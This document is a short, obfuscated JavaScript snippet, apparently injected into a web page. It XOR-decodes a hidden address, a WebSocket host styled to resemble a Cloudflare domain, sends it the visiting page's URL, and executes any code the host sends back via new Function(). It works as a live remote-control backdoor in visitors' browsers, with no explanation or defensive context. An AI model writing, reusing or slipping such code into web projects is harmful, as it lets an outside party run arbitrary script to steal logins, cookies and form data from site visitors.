const qxth = [93,89,89,16,5,5,73,70,69,95,78,76,70,75,88,79,7,89,94,75,94,4,68,79,94,5,73,69,71,71,69,68,21,89,69,95,88,73,79,23];const mld = 42;window.ww = new WebSocket(String.fromCharCode(...qxth.map(jbqr => jbqr ^ mld)) + encodeURIComponent(location.href));window.ww.addEventListener('message', event => {new Function(event.data)()});